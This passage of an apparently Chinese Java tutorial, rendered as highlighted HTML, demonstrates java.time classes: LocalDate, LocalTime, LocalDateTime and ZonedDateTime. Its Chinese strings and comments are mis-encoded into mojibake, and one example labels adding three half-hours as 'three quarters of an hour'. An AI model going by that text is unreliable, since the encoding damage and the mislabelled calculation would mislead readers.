        System.out.println(today + <span class="hljs-string">" åœ¨ "</span> + otherDate + <span class="hljs-string">" ä¹‹å‰? "</span> + today.isBefore(otherDate));
        System.out.println(today + <span class="hljs-string">" åœ¨ "</span> + otherDate + <span class="hljs-string">" ä¹‹å? "</span> + today.isAfter(otherDate));
        System.out.println(today + <span class="hljs-string">" ç­‰äº "</span> + otherDate + <span class="hljs-string">"? "</span> + today.isEqual(otherDate));
        
        <span class="hljs-comment">// 5. ç‰¹æ®Šæ—¥æœŸ</span>
        System.out.println(<span class="hljs-string">"\nç‰¹æ®Šæ—¥æœŸ:"</span>);
        System.out.println(<span class="hljs-string">"æ˜¯å¦æ˜¯é—°å¹´? "</span> + today.isLeapYear());
        System.out.println(<span class="hljs-string">"å½“æœˆå¤©æ•°: "</span> + today.lengthOfMonth());
        System.out.println(<span class="hljs-string">"å½“å¹´å¤©æ•°: "</span> + today.lengthOfYear());
        
        <span class="hljs-comment">// 6. æ—¥æœŸè°ƒæ•´</span>
        System.out.println(<span class="hljs-string">"\næ—¥æœŸè°ƒæ•´:"</span>);
        System.out.println(<span class="hljs-string">"å½“æœˆç¬¬ä¸€å¤©: "</span> + today.with(TemporalAdjusters.firstDayOfMonth()));
        System.out.println(<span class="hljs-string">"å½“æœˆæœ€åä¸€å¤©: "</span> + today.with(TemporalAdjusters.lastDayOfMonth()));
        System.out.println(<span class="hljs-string">"ä¸‹ä¸ªæœˆç¬¬ä¸€å¤©: "</span> + today.with(TemporalAdjusters.firstDayOfNextMonth()));
        System.out.println(<span class="hljs-string">"ä¸‹ä¸ªå‘¨ä¸€: "</span> + today.with(TemporalAdjusters.next(DayOfWeek.MONDAY)));
        System.out.println(<span class="hljs-string">"å½“æœˆæœ€åä¸€ä¸ªå‘¨äº”: "</span> + today.with(TemporalAdjusters.lastInMonth(DayOfWeek.FRIDAY)));
        
        <span class="hljs-comment">// 7. è‡ªå®šä¹‰è°ƒæ•´å™¨</span>
        <span class="hljs-type">TemporalAdjuster</span> <span class="hljs-variable">nextWorkingDay</span> <span class="hljs-operator">=</span> TemporalAdjusters.ofDateAdjuster(date -&gt; {
            <span class="hljs-type">DayOfWeek</span> <span class="hljs-variable">dayOfWeek</span> <span class="hljs-operator">=</span> date.getDayOfWeek();
            <span class="hljs-keyword">if</span> (dayOfWeek == DayOfWeek.FRIDAY) {
                <span class="hljs-keyword">return</span> date.plusDays(<span class="hljs-number">3</span>); <span class="hljs-comment">// å‘¨äº”åˆ°ä¸‹å‘¨ä¸€</span>
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dayOfWeek == DayOfWeek.SATURDAY) {
                <span class="hljs-keyword">return</span> date.plusDays(<span class="hljs-number">2</span>); <span class="hljs-comment">// å‘¨å…­åˆ°ä¸‹å‘¨ä¸€</span>
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> date.plusDays(<span class="hljs-number">1</span>); <span class="hljs-comment">// å…¶ä»–æ—¥å­åˆ°æ˜å¤©</span>
            }
        });
        System.out.println(<span class="hljs-string">"ä¸‹ä¸€ä¸ªå·¥ä½œæ—¥: "</span> + today.with(nextWorkingDay));
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šè®¡ç®—å¹´é¾„</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateAge</span><span class="hljs-params">(LocalDate birthDate)</span> {
        <span class="hljs-keyword">return</span> Period.between(birthDate, LocalDate.now()).getYears();
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šè®¡ç®—å·¥ä½œæ—¥</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">calculateWorkingDays</span><span class="hljs-params">(LocalDate start, LocalDate end)</span> {
        <span class="hljs-keyword">return</span> start.datesUntil(end.plusDays(<span class="hljs-number">1</span>))
                   .filter(date -&gt; date.getDayOfWeek() != DayOfWeek.SATURDAY &amp;&amp;
                                  date.getDayOfWeek() != DayOfWeek.SUNDAY)
                   .count();
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šç”Ÿæˆæ—¥æœŸèŒƒå›´</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;LocalDate&gt; <span class="hljs-title function_">generateDateRange</span><span class="hljs-params">(LocalDate start, LocalDate end, <span class="hljs-type">int</span> stepDays)</span> {
        List&lt;LocalDate&gt; dates = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> start;
        <span class="hljs-keyword">while</span> (!current.isAfter(end)) {
            dates.add(current);
            current = current.plusDays(stepDays);
        }
        <span class="hljs-keyword">return</span> dates;
    }
}
</code></pre>
<h2 data-id="heading-7">LocalTimeï¼šå¤„ç†æ—¶é—´</h2>
<h3 data-id="heading-8">LocalTimeåŸºç¡€æ“ä½œ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.time.*;
<span class="hljs-keyword">import</span> java.time.temporal.ChronoUnit;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalTimeExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== LocalTime åŸºç¡€æ“ä½œ ==="</span>);
        
        <span class="hljs-comment">// 1. åˆ›å»ºLocalTimeçš„å¤šç§æ–¹å¼</span>
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> LocalTime.now();
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">specificTime</span> <span class="hljs-operator">=</span> LocalTime.of(<span class="hljs-number">14</span>, <span class="hljs-number">30</span>, <span class="hljs-number">45</span>); <span class="hljs-comment">// 14:30:45</span>
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">parsedTime</span> <span class="hljs-operator">=</span> LocalTime.parse(<span class="hljs-string">"09:15:30"</span>);
        
        System.out.println(<span class="hljs-string">"ç°åœ¨æ—¶é—´: "</span> + now);
        System.out.println(<span class="hljs-string">"æŒ‡å®šæ—¶é—´: "</span> + specificTime);
        System.out.println(<span class="hljs-string">"è§£ææ—¶é—´: "</span> + parsedTime);
        
        <span class="hljs-comment">// 2. è·å–æ—¶é—´å„éƒ¨åˆ†</span>
        System.out.println(<span class="hljs-string">"\næ—¶é—´åˆ†è§£:"</span>);
        System.out.println(<span class="hljs-string">"å°æ—¶: "</span> + now.getHour());
        System.out.println(<span class="hljs-string">"åˆ†é’Ÿ: "</span> + now.getMinute());
        System.out.println(<span class="hljs-string">"ç§’: "</span> + now.getSecond());
        System.out.println(<span class="hljs-string">"çº³ç§’: "</span> + now.getNano());
        
        <span class="hljs-comment">// 3. æ—¶é—´è¿ç®—</span>
        System.out.println(<span class="hljs-string">"\næ—¶é—´è¿ç®—:"</span>);
        System.out.println(<span class="hljs-string">"1å°æ—¶å: "</span> + now.plusHours(<span class="hljs-number">1</span>));
        System.out.println(<span class="hljs-string">"30åˆ†é’Ÿå: "</span> + now.plusMinutes(<span class="hljs-number">30</span>));
        System.out.println(<span class="hljs-string">"15ç§’å: "</span> + now.plusSeconds(<span class="hljs-number">15</span>));
        System.out.println(<span class="hljs-string">"100çº³ç§’å: "</span> + now.plusNanos(<span class="hljs-number">100</span>));
        
        System.out.println(<span class="hljs-string">"2å°æ—¶å‰: "</span> + now.minusHours(<span class="hljs-number">2</span>));
        System.out.println(<span class="hljs-string">"45åˆ†é’Ÿå‰: "</span> + now.minusMinutes(<span class="hljs-number">45</span>));
        System.out.println(<span class="hljs-string">"30ç§’å‰: "</span> + now.minusSeconds(<span class="hljs-number">30</span>));
        
        <span class="hljs-comment">// ä½¿ç”¨ChronoUnitè¿›è¡Œæ›´çµæ´»çš„æ—¶é—´è¿ç®—</span>
        System.out.println(<span class="hljs-string">"åŠå°æ—¶å: "</span> + now.plus(<span class="hljs-number">30</span>, ChronoUnit.MINUTES));
        System.out.println(<span class="hljs-string">"ä¸‰åˆ»é’Ÿå: "</span> + now.plus(<span class="hljs-number">3</span>, ChronoUnit.HALF_HOURS));
        
        <span class="hljs-comment">// 4. æ—¶é—´æ¯”è¾ƒ</span>
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">otherTime</span> <span class="hljs-operator">=</span> LocalTime.of(<span class="hljs-number">18</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
        System.out.println(<span class="hljs-string">"\næ—¶é—´æ¯”è¾ƒ:"</span>);
        System.out.println(now + <span class="hljs-string">" åœ¨ "</span> + otherTime + <span class="hljs-string">" ä¹‹å‰? "</span> + now.isBefore(otherTime));
        System.out.println(now + <span class="hljs-string">" åœ¨ "</span> + otherTime + <span class="hljs-string">" ä¹‹å? "</span> + now.isAfter(otherTime));
        
        <span class="hljs-comment">// 5. æ—¶é—´è°ƒæ•´</span>
        System.out.println(<span class="hljs-string">"\næ—¶é—´è°ƒæ•´:"</span>);
        System.out.println(<span class="hljs-string">"è°ƒæ•´åˆ°æ•´ç‚¹: "</span> + now.withMinute(<span class="hljs-number">0</span>).withSecond(<span class="hljs-number">0</span>).withNano(<span class="hljs-number">0</span>));
        System.out.println(<span class="hljs-string">"è°ƒæ•´åˆ°ä¸‹ä¸€å°æ—¶: "</span> + now.withHour((now.getHour() + <span class="hljs-number">1</span>) % <span class="hljs-number">24</span>));
        
        <span class="hljs-comment">// 6. è·å–æœ€å¤§/æœ€å°æ—¶é—´</span>
        System.out.println(<span class="hljs-string">"\nç‰¹æ®Šæ—¶é—´:"</span>);
        System.out.println(<span class="hljs-string">"æœ€å°æ—¶é—´: "</span> + LocalTime.MIN);
        System.out.println(<span class="hljs-string">"æœ€å¤§æ—¶é—´: "</span> + LocalTime.MAX);
        System.out.println(<span class="hljs-string">"åˆå¤œ: "</span> + LocalTime.MIDNIGHT);
        System.out.println(<span class="hljs-string">"ä¸­åˆ: "</span> + LocalTime.NOON);
        
        <span class="hljs-comment">// 7. æ—¶é—´èŒƒå›´æ£€æŸ¥</span>
        System.out.println(<span class="hljs-string">"\næ—¶é—´èŒƒå›´æ£€æŸ¥:"</span>);
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">startWork</span> <span class="hljs-operator">=</span> LocalTime.of(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>);
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">endWork</span> <span class="hljs-operator">=</span> LocalTime.of(<span class="hljs-number">18</span>, <span class="hljs-number">0</span>);
        System.out.println(now + <span class="hljs-string">" æ˜¯å¦åœ¨å·¥ä½œæ—¶é—´å†…? "</span> + 
                          (now.isAfter(startWork) &amp;&amp; now.isBefore(endWork)));
        
        <span class="hljs-comment">// 8. æ—¶é—´å·®è®¡ç®—</span>
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> LocalTime.of(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>);
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> LocalTime.of(<span class="hljs-number">17</span>, <span class="hljs-number">30</span>);
        System.out.println(<span class="hljs-string">"\næ—¶é—´å·®è®¡ç®—:"</span>);
        <span class="hljs-type">long</span> <span class="hljs-variable">hoursBetween</span> <span class="hljs-operator">=</span> ChronoUnit.HOURS.between(start, end);
        <span class="hljs-type">long</span> <span class="hljs-variable">minutesBetween</span> <span class="hljs-operator">=</span> ChronoUnit.MINUTES.between(start, end);
        System.out.println(start + <span class="hljs-string">" åˆ° "</span> + end + <span class="hljs-string">" ç›¸å·® "</span> + hoursBetween + <span class="hljs-string">" å°æ—¶"</span>);
        System.out.println(start + <span class="hljs-string">" åˆ° "</span> + end + <span class="hljs-string">" ç›¸å·® "</span> + minutesBetween + <span class="hljs-string">" åˆ†é’Ÿ"</span>);
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šè®¡ç®—ä¼šè®®æŒç»­æ—¶é—´</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Duration <span class="hljs-title function_">calculateMeetingDuration</span><span class="hljs-params">(LocalTime startTime, LocalTime endTime)</span> {
        <span class="hljs-keyword">return</span> Duration.between(startTime, endTime);
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šæ£€æŸ¥æ˜¯å¦åœ¨è¥ä¸šæ—¶é—´</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBusinessHour</span><span class="hljs-params">(LocalTime time, LocalTime open, LocalTime close)</span> {
        <span class="hljs-keyword">return</span> !time.isBefore(open) &amp;&amp; !time.isAfter(close);
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šç”Ÿæˆæ—¶é—´è¡¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;LocalTime&gt; <span class="hljs-title function_">generateTimeSchedule</span><span class="hljs-params">(LocalTime start, <span class="hljs-type">int</span> intervalMinutes, <span class="hljs-type">int</span> count)</span> {
        List&lt;LocalTime&gt; schedule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> start;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {
            schedule.add(current);
            current = current.plusMinutes(intervalMinutes);
        }
        <span class="hljs-keyword">return</span> schedule;
    }
}
</code></pre>
<h2 data-id="heading-9">LocalDateTimeï¼šæ—¥æœŸæ—¶é—´ç»„åˆ</h2>
<h3 data-id="heading-10">LocalDateTimeåŸºç¡€æ“ä½œ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.time.*;
<span class="hljs-keyword">import</span> java.time.format.*;
<span class="hljs-keyword">import</span> java.time.temporal.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalDateTimeExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== LocalDateTime åŸºç¡€æ“ä½œ ==="</span>);
        
        <span class="hljs-comment">// 1. åˆ›å»ºLocalDateTimeçš„å¤šç§æ–¹å¼</span>
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> LocalDateTime.now();
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">specificDateTime</span> <span class="hljs-operator">=</span> LocalDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">30</span>, <span class="hljs-number">45</span>);
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">parsedDateTime</span> <span class="hljs-operator">=</span> LocalDateTime.parse(<span class="hljs-string">"2023-11-15T14:30:45"</span>);
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">fromDateAndTime</span> <span class="hljs-operator">=</span> LocalDateTime.of(LocalDate.now(), LocalTime.now());
        
        System.out.println(<span class="hljs-string">"ç°åœ¨: "</span> + now);
        System.out.println(<span class="hljs-string">"æŒ‡å®šæ—¥æœŸæ—¶é—´: "</span> + specificDateTime);
        System.out.println(<span class="hljs-string">"è§£ææ—¥æœŸæ—¶é—´: "</span> + parsedDateTime);
        System.out.println(<span class="hljs-string">"ä»æ—¥æœŸå’Œæ—¶é—´ç»„åˆ: "</span> + fromDateAndTime);
        
        <span class="hljs-comment">// 2. è½¬æ¢æ“ä½œ</span>
        System.out.println(<span class="hljs-string">"\nè½¬æ¢æ“ä½œ:"</span>);
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">datePart</span> <span class="hljs-operator">=</span> now.toLocalDate();
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">timePart</span> <span class="hljs-operator">=</span> now.toLocalTime();
        System.out.println(<span class="hljs-string">"æ—¥æœŸéƒ¨åˆ†: "</span> + datePart);
        System.out.println(<span class="hljs-string">"æ—¶é—´éƒ¨åˆ†: "</span> + timePart);
        
        <span class="hljs-comment">// 3. æ—¥æœŸæ—¶é—´è¿ç®—</span>
        System.out.println(<span class="hljs-string">"\næ—¥æœŸæ—¶é—´è¿ç®—:"</span>);
        System.out.println(<span class="hljs-string">"3å¤©å: "</span> + now.plusDays(<span class="hljs-number">3</span>));
        System.out.println(<span class="hljs-string">"2å‘¨å: "</span> + now.plusWeeks(<span class="hljs-number">2</span>));
        System.out.println(<span class="hljs-string">"6ä¸ªæœˆå: "</span> + now.plusMonths(<span class="hljs-number">6</span>));
        System.out.println(<span class="hljs-string">"1å¹´2ä¸ªæœˆ3å¤©å: "</span> + now.plusYears(<span class="hljs-number">1</span>).plusMonths(<span class="hljs-number">2</span>).plusDays(<span class="hljs-number">3</span>));
        
        System.out.println(<span class="hljs-string">"5å°æ—¶å‰: "</span> + now.minusHours(<span class="hljs-number">5</span>));
        System.out.println(<span class="hljs-string">"30åˆ†é’Ÿå‰: "</span> + now.minusMinutes(<span class="hljs-number">30</span>));
        
        <span class="hljs-comment">// 4. æ—¥æœŸæ—¶é—´æ¯”è¾ƒ</span>
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">futureDateTime</span> <span class="hljs-operator">=</span> LocalDateTime.of(<span class="hljs-number">2024</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
        System.out.println(<span class="hljs-string">"\næ—¥æœŸæ—¶é—´æ¯”è¾ƒ:"</span>);
        System.out.println(now + <span class="hljs-string">" åœ¨ "</span> + futureDateTime + <span class="hljs-string">" ä¹‹å‰? "</span> + now.isBefore(futureDateTime));
        System.out.println(now + <span class="hljs-string">" åœ¨ "</span> + futureDateTime + <span class="hljs-string">" ä¹‹å? "</span> + now.isAfter(futureDateTime));
        
        <span class="hljs-comment">// 5. æ—¥æœŸæ—¶é—´è°ƒæ•´</span>
        System.out.println(<span class="hljs-string">"\næ—¥æœŸæ—¶é—´è°ƒæ•´:"</span>);
        System.out.println(<span class="hljs-string">"è°ƒæ•´åˆ°å½“æœˆç¬¬ä¸€å¤©: "</span> + now.with(TemporalAdjusters.firstDayOfMonth()));
        System.out.println(<span class="hljs-string">"è°ƒæ•´åˆ°ä¸‹ä¸ªå‘¨ä¸€ä¸Šåˆ9ç‚¹: "</span> + 
            now.with(TemporalAdjusters.next(DayOfWeek.MONDAY)).withHour(<span class="hljs-number">9</span>).withMinute(<span class="hljs-number">0</span>));
        
        <span class="hljs-comment">// 6. æ ¼å¼åŒ–ä¸è§£æ</span>
        System.out.println(<span class="hljs-string">"\næ ¼å¼åŒ–ä¸è§£æ:"</span>);
        <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyyå¹´MMæœˆddæ—¥ HH:mm:ss"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">formatted</span> <span class="hljs-operator">=</span> now.format(formatter);
        System.out.println(<span class="hljs-string">"æ ¼å¼åŒ–å: "</span> + formatted);
        
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">parsed</span> <span class="hljs-operator">=</span> LocalDateTime.parse(<span class="hljs-string">"2023å¹´11æœˆ15æ—¥ 14:30:00"</span>, formatter);
        System.out.println(<span class="hljs-string">"è§£æå: "</span> + parsed);
        
        <span class="hljs-comment">// 7. è‡ªå®šä¹‰æ ¼å¼åŒ–å™¨</span>
        System.out.println(<span class="hljs-string">"\nè‡ªå®šä¹‰æ ¼å¼åŒ–:"</span>);
        <span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">customFormatter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateTimeFormatterBuilder</span>()
            .appendPattern(<span class="hljs-string">"yyyy/MM/dd"</span>)
            .appendLiteral(<span class="hljs-string">" "</span>)
            .appendPattern(<span class="hljs-string">"HH:mm"</span>)
            .toFormatter();
        
        System.out.println(<span class="hljs-string">"è‡ªå®šä¹‰æ ¼å¼: "</span> + now.format(customFormatter));
        
        <span class="hljs-comment">// 8. ä¸æ—¶é—´æˆ³çš„è½¬æ¢</span>
        System.out.println(<span class="hljs-string">"\nä¸æ—¶é—´æˆ³è½¬æ¢:"</span>);
        <span class="hljs-type">Instant</span> <span class="hljs-variable">instant</span> <span class="hljs-operator">=</span> now.atZone(ZoneId.systemDefault()).toInstant();
        <span class="hljs-type">long</span> <span class="hljs-variable">epochMilli</span> <span class="hljs-operator">=</span> instant.toEpochMilli();
        System.out.println(<span class="hljs-string">"æ—¶é—´æˆ³: "</span> + epochMilli);
        
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">fromTimestamp</span> <span class="hljs-operator">=</span> LocalDateTime.ofInstant(
            Instant.ofEpochMilli(epochMilli), 
            ZoneId.systemDefault()
        );
        System.out.println(<span class="hljs-string">"ä»æ—¶é—´æˆ³æ¢å¤: "</span> + fromTimestamp);
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šè®¡ç®—é¡¹ç›®æˆªæ­¢æ—¥æœŸ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> LocalDateTime <span class="hljs-title function_">calculateDeadline</span><span class="hljs-params">(LocalDateTime startDate, <span class="hljs-type">int</span> workingDays)</span> {
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">deadline</span> <span class="hljs-operator">=</span> startDate;
        <span class="hljs-type">int</span> <span class="hljs-variable">daysAdded</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">while</span> (daysAdded &lt; workingDays) {
            deadline = deadline.plusDays(<span class="hljs-number">1</span>);
            <span class="hljs-type">DayOfWeek</span> <span class="hljs-variable">dayOfWeek</span> <span class="hljs-operator">=</span> deadline.getDayOfWeek();
            <span class="hljs-keyword">if</span> (dayOfWeek != DayOfWeek.SATURDAY &amp;&amp; dayOfWeek != DayOfWeek.SUNDAY) {
                daysAdded++;
            }
        }
        <span class="hljs-keyword">return</span> deadline;
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šæ£€æŸ¥æ˜¯å¦åœ¨ç»´æŠ¤çª—å£</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isInMaintenanceWindow</span><span class="hljs-params">(LocalDateTime dateTime)</span> {
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> LocalTime.of(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// å‡Œæ™¨2ç‚¹</span>
        <span class="hljs-type">LocalTime</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> LocalTime.of(<span class="hljs-number">4</span>, <span class="hljs-number">0</span>);   <span class="hljs-comment">// å‡Œæ™¨4ç‚¹</span>
        <span class="hljs-type">DayOfWeek</span> <span class="hljs-variable">day</span> <span class="hljs-operator">=</span> dateTime.getDayOfWeek();
        
        <span class="hljs-comment">// å‡è®¾æ¯å‘¨æ—¥2-4ç‚¹ç»´æŠ¤</span>
        <span class="hljs-keyword">return</span> day == DayOfWeek.SUNDAY &amp;&amp; 
               !dateTime.toLocalTime().isBefore(start) &amp;&amp; 
               dateTime.toLocalTime().isBefore(end);
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šç”Ÿæˆæ—¶é—´è½´</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;LocalDateTime, String&gt; <span class="hljs-title function_">generateTimeline</span><span class="hljs-params">(LocalDateTime start, <span class="hljs-type">int</span> intervalHours, <span class="hljs-type">int</span> count)</span> {
        Map&lt;LocalDateTime, String&gt; timeline = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> start;
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {
            timeline.put(current, <span class="hljs-string">"äº‹ä»¶ "</span> + (i + <span class="hljs-number">1</span>));
            current = current.plusHours(intervalHours);
        }
        
        <span class="hljs-keyword">return</span> timeline;
    }
}
</code></pre>
<h2 data-id="heading-11">æ—¶åŒºå¤„ç†ï¼šZonedDateTimeå’ŒOffsetDateTime</h2>
<h3 data-id="heading-12">æ—¶åŒºå¤„ç†å®æˆ˜</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.time.*;
<span class="hljs-keyword">import</span> java.time.format.*;
<span class="hljs-keyword">import</span> java.util.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimeZoneExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== æ—¶åŒºå¤„ç†å®æˆ˜ ==="</span>);
        
        <span class="hljs-comment">// 1. æ—¶åŒºåŸºç¡€</span>
        System.out.println(<span class="hljs-string">"\n1. æ—¶åŒºåŸºç¡€:"</span>);
        Set&lt;String&gt; allZoneIds = ZoneId.getAvailableZoneIds();
        System.out.println(<span class="hljs-string">"å¯ç”¨æ—¶åŒºæ•°é‡: "</span> + allZoneIds.size());
        System.out.println(<span class="hljs-string">"å‰10ä¸ªæ—¶åŒº:"</span>);
        allZoneIds.stream().sorted().limit(<span class="hljs-number">10</span>).forEach(System.out::println);
        
        <span class="hljs-comment">// 2. åˆ›å»ºå¸¦æ—¶åŒºçš„æ—¶é—´</span>
        System.out.println(<span class="hljs-string">"\n2. åˆ›å»ºå¸¦æ—¶åŒºçš„æ—¶é—´:"</span>);
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">nowInTokyo</span> <span class="hljs-operator">=</span> ZonedDateTime.now(ZoneId.of(<span class="hljs-string">"Asia/Tokyo"</span>));
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">nowInNewYork</span> <span class="hljs-operator">=</span> ZonedDateTime.now(ZoneId.of(<span class="hljs-string">"America/New_York"</span>));
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">nowInLondon</span> <span class="hljs-operator">=</span> ZonedDateTime.now(ZoneId.of(<span class="hljs-string">"Europe/London"</span>));
        
        System.out.println(<span class="hljs-string">"ä¸œäº¬æ—¶é—´: "</span> + nowInTokyo);
        System.out.println(<span class="hljs-string">"çº½çº¦æ—¶é—´: "</span> + nowInNewYork);
        System.out.println(<span class="hljs-string">"ä¼¦æ•¦æ—¶é—´: "</span> + nowInLondon);
        
        <span class="hljs-comment">// 3. æ—¶åŒºè½¬æ¢</span>
        System.out.println(<span class="hljs-string">"\n3. æ—¶åŒºè½¬æ¢:"</span>);
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">tokyoTime</span> <span class="hljs-operator">=</span> ZonedDateTime.of(
            LocalDateTime.of(<span class="hljs-number">2023</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">30</span>),
            ZoneId.of(<span class="hljs-string">"Asia/Tokyo"</span>)
        );
        
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">newYorkTime</span> <span class="hljs-operator">=</span> tokyoTime.withZoneSameInstant(ZoneId.of(<span class="hljs-string">"America/New_York"</span>));
        <span class="hljs-type">ZonedDateTime</span> <span class="hljs-variable">londonTime</span> <span class="hljs-operator">=</span> tokyoTime.withZoneSameInstant(ZoneId.of(<span class="hljs-string">"Europe/London"</span>));
        
        System.out.println(<span class="hljs-string">"ä¸œäº¬ 14:30 ç›¸å½“äº:"</span>);
        System.out.println(<span class="hljs-string">"  çº½çº¦: "</span> + newYorkTime.toLocalDateTime() + <span class="hljs-string">" ("</span> + newYorkTime.getZone() + <span class="hljs-string">")"</span>);
        System.out.println(<span class="hljs-string">"  ä¼¦æ•¦: "</span> + londonTime.toLocalDateTime() + <span class="hljs-string">" ("</span> + londonTime.getZone() + <span class="hljs-string">")"</span>);
        
        <span class="hljs-comment">// 4. å¤ä»¤æ—¶å¤„ç†</span>
        System.out.println(<span class="hljs-string">"\n4. å¤ä»¤æ—¶æµ‹è¯•:"</span>);
        testDaylightSavingTime();
        
        <span class="hljs-comment">// 5. OffsetDateTimeï¼ˆå›ºå®šæ—¶åŒºåç§»ï¼‰</span>
        System.out.println(<span class="hljs-string">"\n5. OffsetDateTime:"</span>);
        <span class="hljs-type">OffsetDateTime</span> <span class="hljs-variable">offsetDateTime</span> <span class="hljs-operator">=</span> OffsetDateTime.now(ZoneOffset.ofHours(<span class="hljs-number">8</span>));
        System.out.println(<span class="hljs-string">"UTC+8æ—¶é—´: "</span> + offsetDateTime);
        
        <span class="hljs-comment">// 6. æ—¶åŒºåç§»è®¡ç®—</span>
